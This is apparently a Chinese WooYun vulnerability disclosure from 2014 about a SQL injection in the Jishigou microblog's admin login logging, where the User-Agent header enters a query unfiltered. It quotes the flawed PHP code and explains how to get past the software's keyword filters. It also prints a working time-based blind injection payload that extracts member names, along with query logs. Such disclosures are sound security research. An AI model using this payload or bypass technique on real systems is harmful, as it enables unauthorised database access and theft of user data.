{"id": 2821, "wybug_id": "wooyun-2014-057741", "wybug_title": "记事狗某处SQL注入一枚。", "wybug_corp": "杭州神话", "wybug_author": "′雨。", "wybug_date": "2014-04-22 17:23", "wybug_open_date": "2014-07-23 18:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： 刚从官网下的。。过滤了各种注释。测试了半天。。 详细说明：  首先先说一下 在modules/report.mod.php中\nfunction DoReport()\t{\t\t$url = get_param('url');\t\t$report_url = get_param('report_url');\t\t$url = get_safe_code(urldecode(urldecode(($url ? $url : $report_url))));\t\t$data = array(\t\t\t'uid' => MEMBER_ID,\t\t\t'username' => MEMBER_NAME,\t\t\t'ip' => $GLOBALS['_J']['client_ip'],\t\t\t'reason' => (int) get_param('report_reason'),\t\t\t'content' => strip_tags(get_param('report_content')),\t\t\t'url' => strip_tags(urldecode($url)),\t\t\t'dateline' => time(),\t\t);\t\t$result = jtaboe('report')->insert($data);\n在举报处这里。  jtaboe('report') 并没有定义这个 而造成了错误、弄得无法举报。  而且会暴露路径。官网测试 http://t.jishigou.net/index.php?mod=report&code=doFatal error: Call to undefined function jtaboe() in /www/home/ftp/1520/t_jishigou-20130129-QTr/t.jishigou.net/modules/report.mod.php on line 65 也希望把这个bug改了一下。____________________________________________________________________________正文在modules/admin/master.mod.php中\nfunction log2db() {\t\tglobal $_J;\t\t$mod = $this->Module;\t\t$code = $this->Code;\t\t$request_method = ('POST'==$_SERVER['REQUEST_METHOD'] ? 'POST' : 'GET');\t\t\t\t$unlog_mod_cods = array('index-recommend'=>1, 'index-upgrade_check'=>1, 'index-lrcmd_nt'=>1, 'upgrade-get_last_verson' => 1,);\t\tif(isset($unlog_mod_cods[\"{$mod}-{$code}\"])) {\t\t\treturn true;\t\t}\t\t\t\t$log_data = array_merge($_GET, $_POST);\t\t$unset_mods = array('ucenter'=>1, 'dzbbs'=>1, 'dedecms'=>1, 'phpwind'=>1, );\t\tif(isset($unset_mods[$mod]) && 'POST'==$request_method) {\t\t\tunset($log_data);\t\t} else {\t\t\t$unset_vars = array('password',);\t\t\tforeach($unset_vars as $var) {\t\t\t\tunset($log_data[$var]);\t\t\t}\t\t}\t\t$data = array(\t\t\t'ip' => $_J['client_ip'],\t\t\t'ip_port' => $_J['client_ip_port'],\t\t\t'dateline' => TIMESTAMP,\t\t\t'uid' => $_J['uid'],\t\t\t'username' => $_J['username'],\t\t\t'nickname' => $_J['nickname'],\t\t\t'mod' => $mod,\t\t\t'code' => $code,\t\t\t'request_method' => $request_method,\t\t\t'role_action_id' => 0,\t\t\t'role_action_name' => \"{$request_method}-{$mod}-{$code}\",\t\t\t'data_length' => strlen(var_export($log_data, true)),\t\t\t'uri' => ($_SERVER['REQUEST_URI'] ? $_SERVER['REQUEST_URI'] : 'admin.php?' . http_build_query($this->Get)),\t\t);\t\t$current_action = $this->MemberHandler->CurrentAction;\t\tif($mod == $current_action['mod']) {\t\t\t$this->RoleActionId = $current_action['id'];\t\t\t$data['role_action_id'] = $this->RoleActionId;\t\t\t$data['role_action_name'] = $current_action['name'];\t\t}\t\t$log_id = DB::insert('log', $data, 1, 1, 1);\t\tif($log_id > 0) {\t\t\t$data = array(\t\t\t\t'log_id' => $log_id,\t\t\t\t'user_agent' => $_SERVER['HTTP_USER_AGENT'],\t\t\t\t'log_data' => base64_encode(serialize($log_data)),\t\t\t\t'dateline' => TIMESTAMP,\t\t\t);\t\t\tDB::insert('log_data', $data, 0, 1, 1);\t\t}\n在登录后台的时候就会调用这个函数  直接把 HTTP_USER_AGENT 带入了查询当中。在测试中发现过滤了substr 和 substring char …………最重要的是过滤掉了 #  /*  -- 。。注释符。   漏洞证明：  首先在后台登录页面 随便输入账户和密码 点击登录。\n\n随便输入错误的号码 然后登录。  这时候查看一下所执行的语句。\n1248 Query\tREPLACE INTO jishigou_log SET `ip`='127.0.0.1',`ip_port`='1700',`dateline`='1397897431',`uid`='0',`username`='guest',`nickname`='游客',`mod`='login',`code`='dologin',`request_method`='POST',`role_action_id`='0',`role_action_name`='POST-login-dologin',`data_length`='193',`uri`='/jishigou/admin.php?mod=login&code=dologin'\t\t 1248 Query\tREPLACE INTO jishigou_log_data SET `log_id`='163',`user_agent`='Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0',`log_data`='YTo2OntzOjM6Im1vZCI7czo1OiJsb2dpbiI7czo0OiJjb2RlIjtzOjc6ImRvbG9naW4iO3M6ODoiRk9STUhBU0giO3M6MTY6ImFiNDVlNTQ0MmQ2ZWI0YWIiO3M6NzoicmVmZXJlciI7czozNjoiaHR0cDovLzEyNy4wLjAuMS9qaXNoaWdvdS9hZG1pbi5waHA/IjtzOjg6InVzZXJuYW1lIjtzOjc6ImFzZGFhZmEiO3M6Njoic3VibWl0IjtzOjU6IrXHIMK8Ijt9',`dateline`='1397897431'\t\t 1248 Query\tSELECT count, lastupdate FROM jishigou_failedlogins WHERE ip='127.0.0.1'\t\t 1248 Query\tSELECT * FROM jishigou_failedlogins WHERE ip='127.0.0.1'\t\t 1248 Query\tSELECT * FROM jishigou_members  WHERE  `nickname` IN ('asdaafa')    LIMIT 1\t\t 1248 Query\tSELECT * FROM jishigou_members  WHERE  `username` IN ('asdaafa')    LIMIT 1\t\t 1248 Query\tREPLACE INTO jishigou_failedlogins (ip, count, lastupdate) VALUES ('127.0.0.1', '1', '1397897431')\t\t 1248 Quit\nREPLACE INTO jishigou_log_data SET `log_id`='163',`user_agent`='Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0',`log_data`='YTo2OntzOjM6Im1vZCI7czo1OiJsb2dpbiI7czo0OiJjb2RlIjtzOjc6ImRvbG9naW4iO3M6ODoiRk9STUhBU0giO3M6MTY6ImFiNDVlNTQ0MmQ2ZWI0YWIiO3M6NzoicmVmZXJlciI7czozNjoiaHR0cDovLzEyNy4wLjAuMS9qaXNoaWdvdS9hZG1pbi5waHA/IjtzOjg6InVzZXJuYW1lIjtzOjc6ImFzZGFhZmEiO3M6Njoic3VibWl0IjtzOjU6IrXHIMK8Ijt9',`dateline`='1397897431'可以看到这个语句 把user_agent 带入 且无过滤。 来构造语句。 过滤了substr substring 就来用left在测试中发现 select xx 这样select 也会被过滤 但是(select 这样就不会被过滤。过滤了char 就不用char 直接ascii 得数字来盲注过滤了注释符 就补全语句。\n\n相等即延时。  此时执行的语句为1249 Query REPLACE INTO jishigou_log_data SET `log_id`='164',`user_agent`='1' and if(ascii(left((select nickname from jishigou_members limit 0,1),1))=97,sleep(10),null) and '',`log_data`='YTo2OntzOjM6Im1vZCI7czo1OiJsb2dpbiI7czo0OiJjb2RlIjtzOjc6ImRvbG9naW4iO3M6ODoiRk9STUhBU0giO3M6MTY6ImFiNDVlNTQ0MmQ2ZWI0YWIiO3M6NzoicmVmZXJlciI7czozNjoiaHR0cDovLzEyNy4wLjAuMS9qaXNoaWdvdS9hZG1pbi5waHA/IjtzOjg6InVzZXJuYW1lIjtzOjY6ImFhYWFhYSI7czo2OiJzdWJtaXQiO3M6NToitccgwrwiO30=',`dateline`='1397897572'\n\n相等延时 即可注入。这样就绕过了对这些的过滤。有图有真相。   修复方案：  过滤。也要把那个bug修复了额。求高分。 谢谢。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-04-25 09:02 厂商回复： 感谢反馈，我们在抓紧处理了 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-22 19:32 |    \t\t九九 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:4        | 暂无。)\t\t \n  好屌的雨牛    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}